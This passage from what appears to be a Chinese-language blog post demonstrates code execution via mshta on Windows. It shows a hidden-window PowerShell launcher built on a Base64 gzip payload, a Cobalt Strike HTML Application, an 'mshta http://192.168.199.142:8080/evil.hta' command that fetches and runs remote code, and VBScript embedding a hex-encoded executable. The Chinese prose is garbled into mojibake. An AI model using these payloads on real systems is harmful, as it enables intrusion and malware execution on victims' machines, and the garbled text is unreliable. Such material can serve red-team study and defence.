1m2nvUN3q5ljTppjOgw8Gy2+LzyYjhoat548oVpttevBhVInNvINT2L+x91x21fdPZTTqULLRyjw7QAKEb+344bHsrr50g7Wr0XA8W6NkkdxgZqDnadd8xfTBs6WjY1Af4LupfnDW0ypPz3Gw9jXE3YE67o1UmY+SgWHvw/MrlnR8KnLCnP+tCBvWedi0NZPo11KlV6f7pedD2UBNkRkGEcIsuh2djsHn7ADqPw4oTIR4aY00beZqHXMufYKSDtP6MWnpU333om31tNKr6lfmy4oPPZLz+YHbRWcvua5p2FszhV0O2udqGY31zud5w3H0E2w/a1fDjW8EQoEhhVa0+vcj9j7q1iePExww4AW04L8FWFLey3tqPqNBQFHEZL0kcEga3Gdx3OZURY5Et+rpownClHBu9uHeGMLyovjpSpS+C6td2ny9dXz+Bj1AaQN9Sj4Qe94vl7UW5DO27vK2VIcSfD6serXaKsFQU3f8AS2aZHSyromAK6fJ/xSqrUR/+nH/B6uvaP+z+FH7l4jHa75a/XfglNH818EdMOQha0GMYOV5vr8af0eLF1Z8uIedu9og3t7uUn9/C+8Cb078ABtGBSyEKAAA='</span><span class="string">'))),[IO.Compression.CompressionMode]::Decompress))).ReadToEnd()))'</span>;<span class="variable">$s</span>.UseShellExecute=<span class="literal">$false</span>;<span class="variable">$s</span>.RedirectStandardOutput=<span class="literal">$true</span>;<span class="variable">$s</span>.WindowStyle=<span class="string">'Hidden'</span>;<span class="variable">$s</span>.CreateNoWindow=<span class="literal">$true</span>;<span class="variable">$p</span>=[System.Diagnostics.Process]::Start(<span class="variable">$s</span>);</span><br></pre></td></tr></table></figure></p><p>GzipÊñá‰ª∂ÊµÅBase64Âä†ÂØÜ</p><p>DefenderÊã¶Êà™</p><h2 id="0x03-Cobalt-Strike"><a href="#0x03-Cobalt-Strike" class="headerlink" title="0x03 Cobalt Strike"></a>0x03 Cobalt Strike</h2><p>Attacks ‚Äì&gt; Packages ‚Äì&gt; HTML Application</p><p><img src="/Command Execute By mshta.resources/8BB9866F-36A0-489E-85CF-1710CBAA086D.png" alt="b38801405640b4a557ac53ba451a66db"></p><p>ÁîüÊàêÁöÑ.HTAÊñá‰ª∂Â≠òÂú®Êú¨Âú∞ÔºåÂèØ‰ª•ÈÄöËøáÂ§öÁßçÊñπÂºè‰º†ÂÖ•ÂèóÂÆ≥Êú∫<br>ÂèóÂÆ≥Êú∫‰∏äÊâßË°åÂëΩ‰ª§<br><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mshta http://<span class="number">192</span>.<span class="number">168</span>.<span class="number">199</span>.<span class="number">142</span>:<span class="number">8080</span>/evil.hta</span><br></pre></td></tr></table></figure></p><p>evil.hta<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">&lt;script language=&quot;VBScript&quot;&gt;</span><br><span class="line">Function var_func()</span><br><span class="line">var_shellcode = &quot;04d5a9000300000004000000ffff0000b800000000000000400000000000000000000000000000000000000000000000000000000000000000000000800000000e1fba0e00b409cd21b8014ccd21546869732070726f6772616d2063616e6e6f742062652072756e20696e20444f53206d6f64652e0d0d0a2400000000000000504500004c010700e26f3a570000000000000000e0000f030b010216001c00000034000000060000b0140000001000000030000000004000001000000002000004000000010000000400000000000000009000000004000024dc0000020000000000200000100000000010000010000000000000100000000000000000000000006000003006000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000080000018000000000000000000000000000000000000001c610000e00000000000000000000000000000000000000000000000000000002e74657874000000c41a000000100000001c000000040000000000000000000000000000600050602e6461746100000024060000003000000008000000200000000000000000000000000000400060c02e72646174610000d0020000004000000004000000280000000000000000000000000000400030402e627373000000001c040000005000000000000000000000000000000000000000000000800060c02e69646174610000300600000060000000080000002c0000000000000000000000000000400030c02e4352540000000034000000007000000002000000340000000000000000000000000000400030c02e746c730000000020000000008000000002000000360000000000000000000000000000400030c00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000f3c38db426000000008dbc270000000083ec2ca120504000c744241018504000c74424080c504000c744240408504000a318504000a124504000c70424045040008944240ce896190000a31c50400083c42cc38db6000000008dbc270000000083ec1c31c066813d000040004d5ac7053050400001000000c7052c50400001000000c7052850400001000000c7053c504000010000007468a314504000a14050400085c0744ac7042402000000e836190000c70424ffffffffe8020800008b1544504000a3fc534000a300544000a1ac6140008910e8260b0000833d1436400001746d31c083c41cc38db42600000000c7042401000000e8ec180000ebb466908b153c00400081ba00004000504500008d8a0000400075800fb751186681fa0b01743f6681fa0b020f856affffff83b9840000000e0f865dffffff8b91f800000031c085d20f95c0e94bffffff8d7600c70424a01b4000e8340a000031c083c41cc38379740e0f862cffffff8b89e800000031c085c90f95c0e91affffff66905531c089e5b91100000057568d55a45389d783ec7cf3abb030e8d217000029c48d44241b83e0f0c700ccccccccc74004ccccccccc74008ccccccccc7400cccccccccc74010ccccccccc74014ccccccccc74018ccccccccc7401ccccccccc83e4f0a14050400085c00f858502000064a1180000008b35686140008b5804eb159039d80f8418020000c70424e8030000ffd683ec04c744240800000000895c2404c7042404544000e89417000083ec0c85c075cda10854400031db83f8010f84f0010000a10854400085c00f8434020000c7050050400001000000a10854400083f8010f84e801000085db7507f0871d04544000a18040400085c0741cc744240800000000c744240402000000c7042400000000ffd083ec0ce8130c0000c70424b0194000ff156461400083ec04a348504000e8a9110000c744240400404000890424ff154061400083ec0885c07409c7042400104000ffd0e843120000a14050400085c0745ea1a061400031c98b00eb0b84d2742b84c9741c83c0010fb61080fa207eed89cb83f30180fa220f44cbebe884d2740b83c0010fb61080fa207ef10fb755d4f645d001a3e4534000b80a000000c705ec534000000040000f45c2a3e85340008b150450400031db8d049504000000895594890424e89a1600008b3d085040008945908b459485c07e3c66908b049f890424e8851600008d7001893424e8721600008b559089049a8b149f83c3018974240889042489542404e84e1600003b5d9475c9c1e3028b4590c7041800000000a308504000e8f2110000a1906140008b150c5040008910a10c50400089442408a10850400089442404a104504000890424e89a0200008b351450400085f6a3105040000f84aa0000008b1d0050400085db750ae8fc150000a1105040008d65f45b5e5f5dc38db42600000000a108544000bb0100000083f8010f8510feffffc704241f000000e8d1150000a10854400083f8010f851bfeffff8d7600c744240408704000c7042400704000e8b4150000c7050854400002000000e9f5fdffff891424ff154461400083ec04e96afdffffc7050854400001000000c744240418704000c704240c704000e876150000e9b3fdffff890424e8711500009083ec0cc7054050400001000000e80e11000083c40ce9b6fcffff8db60000000083ec0cc7054050400000000000e8ee10000083c40ce996fcffff9090909090905589e583ec18a12036400085c0743cc7042420404000ff153c614000ba0000000083ec0485c07416c74424042e404000890424ff154061400083ec0889c285d27409c7042420364000ffd2c9c38d76005589e55dc390909090909090909090905589e55383ec348b450cc744240c40000000c74424080010000089442404c7042400000000a178614000ffd083ec108945f0c745f400000000eb448b45f489c1034d088b45f40345080fb6188b45f489c2c1fa1fc1ea1e01d083e00329d00345100fb60031d888018b45f489c20355088b45f40345f00fb61288108345f4018b45f43b450c7cb48b45f0c744241400000000c744241000000000c744240c0000000089442408c744240400000000c7042400000000a11c614000ffd083ec188b5dfcc9c35589e583ec28c745f4003040008b45f48b4004890424e8c91300008945f08b45f48b400489c18b45f483c01089c28b45f0894c240889542404890424e89b1300008b45f48d50088b45f48b400489542408894424048b45f0890424e8dcfeffff8b45f0890424e8a9130000c9c39090908d4c240483e4f0ff71fc5589e55183ec14e8160f0000c7042400000000e86effffffc7042410270000a168614000ffd083ec04ebed9090900000000083ec1c8b44242485c0741583f8037410b80100000083c41cc20c00908d7426008b542428894424048b44242089542408890424e8d8110000b80100000083c41cc20c008db6000000008dbc27000000005383ec188b15c46140008b442424833a037631833d1036400002740ac705103640000200000083f8020f840401000083f8010f849a00000083c418b8010000005bc20c00c705f853400001000000c7042444404000ff155861400083ec0485c0a3385040000f84f80000008b1d40614000c744240451404000890424ffd3a3f4534000a13850400083ec08c74424046c404000890424ffd38b153850400083ec0885d2a3f05340000f84b50000008b0df453400085c9743b85c07437c705103640000100000083c418b8010000005bc20c008b442428c744240401000000894424088b442420890424e8d2100000e945ffffffc705f053400000000000c705f453400000000000891424ff152861400083ec04c7053850400000000000b801000000c705103640000000000083c4185bc20c00bb3070400081fb307040000f84f4feffff8b0385c07402ffd083c30481fb3070400075ed83c418b8010000005bc20c00c705f053400000000000c705f453400000000000eb9a8db4260000000031c0c390909090909090909090909090a194614000ffe09090909090909090908b442404c38d7426008dbc27000000008b442404c390909090909090909090905383ec28a1005440008b5c2430890424e8cbffffff83f8ff894424180f847e000000c7042408000000e832110000a100544000890424e8a5ffffff89442418a1fc534000890424e894ffffff891c248944241c8d44241c894424088d44241889442404e80011000089c38b442418890424e87affffffa3005440008b44241c890424e869ffffffc7042408000000a3fc534000e8d810000083c42889d85bc390891c24ff15bc61400083c42889c389d85bc38db426000000008dbc270000000083ec1c8b442420890424e831ffffff83f80119c083c41cc39090909090909090565383ec248b5c24308b038b003d910000c077433d8d0000c07269be01000000c744240400000000c7042408000000e86410000083f8010f841301000085c0742bc7042408000000ffd0b8ffffffff83c4245b5ec204003d940000c074673d960000c0742d3d930000c074afa14850400085c00f84ca000000895c243083c4245b5effe03d050000c074453d1d0000c075dac744240400000000c7042404000000e8f20f000083f801745c85c074bdc7042404000000ffd083c424b8ffffffff5b5ec2040031f6e954ffffff8d742600c744240400000000c704240b000000e8b40f000083f801743c85c00f847bffffffc704240b000000ffd083c424b8ffffffff5b5ec20400c744240401000000c7042404000000e87d0f0000b8ffffffffe92affffffc744240401000000c704240b000000e85f0f0000b8ffffffffe90cffffff31c0e905ffffff8db600000000c744240401000000c7042408000000e8340f000085f6b8ffffffff0f84defeffff8944241ce8f60900008b44241ce9ccfeffff9090909090909090909090909083ec3ca14c504000dd442448dd442450dd44245885c07429d9ca8b542440dd5c2418dd5c2420dd5c2428895424108b542444895424148d542410891424ffd0eb06ddd8ddd8ddd883c43cc3908d7426008b442404a34c504000e9b20e0000669083ec3cba844040008b4424408b0883e90183f90577078b148da0414000dd4018dd5c2420dd4010dd5c2418dd4008dd5c24108b400489542408c7442404944040008944240ca1b461400083c040890424e8630e000031c083c43cc3909090909031c0c3909090909090909090909090905383ec18a1b4614000c74424081b0000008d5c2424c744240401000000c70424b841400083c0408944240ce8200e00008b442420895c240889442404a1b461400083c040890424e80c0e0000e80f0e0000eb0d909090909090909090909090905589cd57565389c383ec6c8b0d585040008954241c85c90f8ec5010000a15450400031f68b500439d3720e8b780803570839d30f82d700000083c60183c00c39ce75e1891c24e8b505000085c089c70f84b40100008d14768b3554504000c1e20201d6894608c7060000000089542418e86b0600008b54241803470c8946048d4424408b358061400089442404a154504000c74424081c0000008b441004890424ffd683ec0c85c08b5424180f84370100008b44245483f8040f85d2000000830558504000018d442424c74424081c00000089442404891c24ffd683ec0c85c00f84330100008b44243883f80475298b44241c896c2408891c2489442404e87d0c000083c46c5b5e5f5dc3908d7426008b3580614000ebae83f84074d28b4424308d7c245c8b357c614000897c240cc744240840000000894424048b442424890424ffd683ec108b44241c896c2408891c2489442404e8250c00008b44243883f840749f83f804749a8b44245c897c240c894424088b442430894424048b442424890424ffd683ec1083c46c5b5e5f5dc383f8400f8425ffffff8b44244c031554504000c744240840000000894424048b4424408954240c890424ff157c61400083ec1085c00f85f3feffffff1538614000c704242842400089442404e8befdffff31f6e95afeffffa1545040008b441004894424088b4708c70424f441400089442404e897fdffff895c2404c70424d4414000e887fdffff895c2408c74424041c000000c70424f4414000e86ffdffffeb0d909090909090909090909090905589e557565383ec4ca15050400085c0740e8d65f45b5e5f5dc38db600000000c7055050400001000000e8d10300008d04408d04851e00000083e0f0e87f0a0000c705585040000000000029c48d44241f83e0f0a354504000b8d04240002dd042400083f8077eaa83f80bbbd04240000f8eea000000a1d042400085c07511a1d442400085c00f84c00000008d74260081fbd04240000f8376ffffffbe000040008b4304b90400000001f08b10031383c3088955e48d55e4e803fdffff81fbd042400072dc8b0d5850400085c90f8e3fffffff31db31f68b3d80614000eb139083c60183c30c3b35585040000f8d20ffffffa15450400001d88b1085d274e18d55c4c74424081c000000895424048b4004890424ffd783ec0c85c00f84510100008d45e48944240ca1545040008b0418894424088b45d0894424048b45c4890424ff157c61400083ec10eb94a1d842400085c07520bbdc4240008db6000000008b3b85ff0f8526ffffff8b730485f60f851bffffff8b430883f8010f851401000083c30c81fbd04240000f8382feffff0fb65308b8000040008b0b03430483fa108bb100004000744183fa20747283fa08741789542404c7042484424000c745e000000000e896fbffff0fb638f7c780000000742081cf00ffffff29cf81ef0000400001fe8975e0eb270fb738f7c700800000755b29cf81ef0000400001fe83fa108975e0745c83fa20742383fa08752bb9010000008d55e0e8a2fbffffeb1c8b1029ca81ea0000400001f28955e0b9040000008d55e0e884fbffff83c30c81fbd04240000f8245ffffffe975feffff81cf0000ffff29cf81ef0000400001fe8975e0b9020000008d55e0e850fbffffebca031d545040008b4304894424088b43088b4008c70424f441400089442404e8cbfaffff89442404c7042450424000e8bbfaffff90909090909090909090908b54240431c066813a4d5a7403f3c39003523c813a5045000075f231c066817a180b010f94c0c389f68dbc27000000005631c0538b54240c8b5c241003523c0fb772060fb74a1485f674230fb7c98d440a1831d28b480c39d9770703480839cb720c83c20183c02839f272e831c05b5ec3eb0d909090909090909090909090905557565331db83ec1c8b7c2430893c24e80b08000083f8087759c7042400004000e85affffff85c07449a13c0040000fb7a8060040000fb79014004000050000400085ed742d0fb7d231f68d5c1018eb0a83c60183c32839ee7325c744240808000000897c2404891c24e82908000085c075de83c41c89d85b5e5f5dc38d760083c41c31db89d85b5e5f5dc38d74260083ec08c7042400004000e8e1feffff89c231c085d274198b44240cc70424000040002d0000400089442404e8f0feffff83c408c38db6000000008dbf0000000083ec04c7042400004000e8a1feffff31d285c0740ca13c0040000fb7900600400089d083c404c389f68dbc2700000000565383ec04c70424000040008b5c2410e86bfeffff31d285c0743ea13c0040000fb788060040000fb7b014004000050000400085c974220fb7f68d54301831c0f6422720740785db740f83eb0183c00183c22839c872e931d283c40489d05b5ec3eb0d9090909090909090909090909083ec04c7042400004000e801feffff31d285c0b8000040000f45d083c40489d0c3eb0d909090909090909090909090905331db83ec08c7042400004000e8cefdffff85c0750a83c40889d85bc38d76008b442410c70424000040002d0000400089442404e8d7fdffff85c074d98b582483c408f7d3c1eb1f89d85bc38d7426005731ff565383ec08c70424000040008b5c2418e878fdffff85c07455a13c0040008bb08000400085f6744689742404c7042400004000e885fdffff85c0743281c600004000750feb288db4260000000083eb0183c6148b560485d275078b460c85c0741c85db7fe88b7e0c81c70000400083c40889f85b5e5fc38db60000000083c40831ff89f85b5e5fc3908d7426005383ec18a15c50400085c0740583c4185bc331c08904248d5801e851ffffff85c0747d0fb61080fa4d740580fa6d75500fb6500180fa53740580fa7375420fb6500280fa56740580fa7675340fb6500380fa43740580fa6375260fb6500480fa52740580fa7275180fb6500580fa54741380fa74740e83ea3080fa097606669089d8eb90890424ff153c61400083ec0485c0a35c5040000f8570ffffff8d7600c70424b0424000ff155c61400083ec04a35c504000e953ffffff909090909090dbe3c39090909090909090909090909083ec0ca10c3640008b0085c074196690ffd0a10c3640008d50048b400489150c36400085c075e983c40cc3908d7426005383ec188b1db02a400083fbff742485db740fff149db02a400083eb018d760075f1c7042430254000e802f4ffff83c4185bc331dbeb0289c38d43018b1485b02a400085d275f0ebc68db426000000008b0d6050400085c97406f3c38d742600c7056050400001000000eb949090909083ec4ca118364000895c243c89742440897c24443d4ee640bb896c2448c744242000000000c7442424000000007421f7d0a31c3640008b5c243c8b7424408b7c24448b6c244883c44cc38db6000000008d442420890424ff154861400083ec048b4424248b6c24208944241cff153061400089c7ff153461400089c6ff154c61400089c38d442428890424ff156061400083ec04336c241c336c2428336c242c31fd31f531dd89e881fd4ee640bbf7d07410892d18364000a31c364000e974ffffffb8b019bf44bd4fe640bbebe466905589e583ec288b45048d5504891544514000c70560534000090400c0c7056453400001000000a338514000a36c5340008b4508c7042400000000a32c514000a1183640008945f0a11c3640008945f4ff156461400083ec04c70424c8424000ff157461400083ec04ff152c614000c7442404090400c0890424ff156c61400083ec08e8490300009090909090909090905557565383ec1cc70424c4534000ff15246140008b1ddc53400083ec0485db74348b2d706140008b3d386140008d76008b03890424ffd583ec0489c6ffd785c0750c85f674088b4304893424ffd08b5b0885db75dbc70424c4534000ff155461400083ec0483c41c5b5e5f5dc38d760083ec1ca1c0534000895c241431db8974241885c0750e89d88b7424188b5c241483c41cc3c74424040c000000c7042401000000e8a802000085c089c674498b442420c70424c453400089068b442424894604ff1524614000a1dc5340008935dc53400089460883ec04c70424c4534000ff155461400089d883ec048b5c24148b74241883c41cc3bbffffffffeb8866905383ec18a1c05340008b5c242085c0750783c41831c05bc3c70424c4534000ff15246140008b15dc53400083ec0485d2741d8b0239d87510eb4c8db6000000008b0839d9742089c28b420885c075f1c70424c4534000ff155461400083ec0483c41831c05bc38b4808894a08890424e884010000c70424c4534000ff155461400083ec04ebd98b4208a3dc53400089d0ebda8db426000000008dbc270000000083ec1c8b44242483f8017444721283f803745db80100000083c41cc38d742600a1c053400085c07569a1c053400083f80175e0c705c053400000000000c70424c4534000ff152061400083ec04ebc490a1c053400085c07427c705c053400001000000b80100000083c41cc38d742600a1c053400085c0749ae8e2fdffffeb93c70424c4534000ff155061400083ec04ebc7e8c9fdffffeb909090909090909051503d001000008d4c240c721581e9001000008309002d001000003d0010000077eb29c18309005859c39090000000008b44240c8b5424088b4c2404f00fb111c3eb0d909090909090909090909090908b44240c8b5424088b4c2404f00fb111c20c0090909090909090909090909090ff258c6140009090ff25986140009090ff25e46140009090ff25e06140009090ff25ec6140009090ff25a86140009090ff25a46140009090ff25b06140009090ff25d06140009090ff25d86140009090ff25b86140009090ff25886140009090ff25c06140009090ff25e86140009090ff259c6140009090ff25d46140009090ff25dc6140009090ff25f46140009090ff25c86140009090ff25f06140009090ff25cc614000909000000000000000005589e583ec18e855eaffffc7042440154000e8e9eeffffc9c390909090909090ffffffff902a400000000000ffffffff000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000010200000110200005694e0fa61616161aa7c69fa56948073b3a5329eddc6d07104986ba8421f92d25923aadc676bd13afaa8818654b8c03b9999e13db464b2adddc6f07114a8e12addd4987f96e0aafb86c46bb24e1fb8da574703c61f1fd4715742d10567544c3b9999e13d6e74950e55e918c12bb095180e1fb8de574786715adf6ba24a953371521fe12adfd0c4de0dcf81a30cc51f1a0ecbba71447f66a73efa858e56fc979338fdb4921ae3c6fda941087a5694e0b739ee89963af5cfcf78a4c0d235fb8d8a37e089983af1dbda1bc7a9bf76adceca6db4b79338f08f8d25b4aeae76a2cecb6db4b79338a2d4c176ecd6ce6db4b4883ff0859422bbd5d466afc0b819dda5c36dd1aeaf05bde0a20eccb8a20eccb8a20eccb8a20eccb8a20eccb8a20eccb8a20eccb8a20eccb8a20eccb8a20ecce0a3676bb7ad01c3b1926cc2995da9410b830da529ab07fee3ab07fcb0fa5694b3aa3ec36965906b351134cdd12804fce0f83610b2a804c5b2aa3e7fb5d46d6b357390a51fad01c3b7ac3eb9e6e22d6b357f96e0a4cba911168e521d19115ffc4a3fb4c91f2fdf5588bf77cad10583a51fad3c93b1ac06fc57adb69f1f2fe994cffa56ad278eeaa51f11437fa912cf6b1f0579f8b6b71b94e092a62142aca9418aba3e94f0fa56fce0fa1694b7920e30b31fa94173a9051d07ad3e94c0fa56c7b69244026918a941653a22596bfd5757653a2371b839bea31f05a9a5d9c878a5d6c278a5d9c378a5d4c85658354f2150254041505b345c505a58353428505e2937434329377d2445494341522d5354414e444152442d414e544956495255532d544553542d46494c452124482b482a4141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141410000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000ff000000ffffffffffffffffc02a400002000000ffffffff4ee640bbb119bf440000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000005f7365745f696e76616c69645f706172616d657465725f68616e646c657200006c696267636a2d31322e646c6c005f4a765f5265676973746572436c61737365730000006d696e67776d31302e646c6c005f5f6d696e67777468725f72656d6f76655f6b65795f64746f72005f5f6d696e67777468725f6b65795f64746f720010174000556e6b6e6f776e206572726f720000005f6d61746865727228293a20257320696e2025732825672c2025672920202872657476616c3d2567290a0000417267756d656e7420646f6d61696e206572726f722028444f4d41494e2900417267756d656e742073696e67756c617269747920285349474e2900004f766572666c6f772072616e6765206572726f7220284f564552464c4f57290054686520726573756c7420697320746f6f20736d616c6c20746f20626520726570726573656e7465642028554e444552464c4f5729000000546f74616c206c6f7373206f66207369676e69666963616e63652028544c4f53532900005061727469616c206c6f7373206f66207369676e69666963616e63652028504c4f53532900000000c0404000df404000fc4040001c41400054414000784140004d696e67772d7736342072756e74696d65206661696c7572653a0a004164647265737320257020686173206e6f20696d6167652d73656374696f6e0020205669727475616c5175657279206661696c656420666f7220256420627974657320617420616464726573732025700000000020205669727475616c50726f74656374206661696c6564207769746820636f6465203078257800002020556e6b6e6f776e2070736575646f2072656c6f636174696f6e2070726f746f636f6c2076657273696f6e2025642e0a0000002020556e6b6e6f776e2070736575646f2072656c6f636174696f6e206269742073697a652025642e0a0000006d00730076006300720074002e0064006c006c00000000006053400080504000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000003c6000000000000000000000a46500001c610000a8600000000000000000000024660000886100000000000000000000000000000000000000000000fc6100000c620000246200003c6200004a6200005e620000746200008a6200009a620000ae620000c0620000d2620000ec620000fc620000186300003063000040630000506300006a6300008863000090630000a4630000b2630000ce630000de630000f063000000000000006400000e6400001e6400002a6400003a6400004c640000606400006a64000078640000826400008c64000098640000a0640000a8640000b2640000bc640000c8640000d0640000da640000e2640000ec640000f4640000fe64000008650000126500001c650000266500003065000000000000fc6100000c620000246200003c6200004a6200005e620000746200008a6200009a620000ae620000c0620000d2620000ec620000fc620000186300003063000040630000506300006a6300008863000090630000a4630000b2630000ce630000de630000f063000000000000006400000e6400001e6400002a6400003a6400004c640000606400006a64000078640000826400008c64000098640000a0640000a8640000b2640000bc640000c8640000d0640000da640000e2640000ec640000f4640000fe64000008650000126500001c650000266500003065000000000000a7004372656174655468726561640000c40044656c657465437269746963616c53656374696f6e00df00456e746572437269746963616c53656374696f6e00005301467265654c69627261727900b10147657443757272656e7450726f6365737300b20147657443757272656e7450726f63657373496400b50147657443757272656e7454687265616449640000ee014765744c6173744572726f720000fe014765744d6f64756c6548616e646c65410000290247657450726f63416464726573730000440247657453746172747570496e666f41005b0247657453797374656d54696d65417346696c6554696d650073024765745469636b436f756e740000c602496e697469616c697a65437269746963616c53656374696f6e0001034c65617665437269746963616c53656374696f6e000003034c6f61644c69627261727941000006034c6f61644c69627261727957000067035175657279506572666f726d616e6365436f756e746572003104536574556e68616e646c6564457863657074696f6e46696c746572003d04536c6565700049045465726d696e61746550726f6365737300005004546c7347657456616c7565005d04556e68616e646c6564457863657074696f6e46696c746572000074045669727475616c416c6c6f6300007d045669727475616c50726f74656374000080045669727475616c5175657279000038005f5f646c6c6f6e65786974003b005f5f6765746d61696e61726773003c005f5f696e6974656e760045005f5f6c636f6e765f696e6974000069005f5f7365745f6170705f7479706500006c005f5f736574757365726d61746865727200007a005f61636d646c6e008f005f616d73675f657869740000a0005f63657869740000fc005f666d6f646500003d015f696e69747465726d0041015f696f620000a5015f6c6f636b0047025f6f6e6578697400f5025f756e6c6f636b007b035f77696e6d616a6f7200bd0361626f727400cb0363616c6c6f630000d503657869740000e503667072696e746600ec03667265650000f703667772697465000024046d616c6c6f6300002c046d656d637079000049047369676e616c00005d047374726c656e000060047374726e636d7000800476667072696e7466000000600000006000000060000000600000006000000060000000600000006000000060000000600000006000000060000000600000006000000060000000600000006000000060000000600000006000000060000000600000006000000060000000600000006000004b45524e454c33322e646c6c00000000146000001460000014600000146000001460000014600000146000001460000014600000146000001460000014600000146000001460000014600000146000001460000014600000146000001460000014600000146000001460000014600000146000001460000014600000146000006d73766372742e646c6c000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000010104000000000000000000060104000a0184000000000000000000010174000c016400000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000198040001c804000345040002070400000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000&quot;</span><br><span class="line"></span><br><span class="line">Dim var_obj</span><br><span class="line">Set var_obj = CreateObject(&quot;Scripting.FileSystemObject&quot;)</span><br><span class="line">Dim var_stream</span><br><span class="line">Dim var_tempdir</span><br><span class="line">Dim var_tempexe</span><br><span class="line">Dim var_basedir</span><br><span class="line">Set var_tempdir = var_obj.GetSpecialFolder(2)</span><br><span class="line">var_basedir = var_tempdir &amp; &quot;\&quot; &amp; 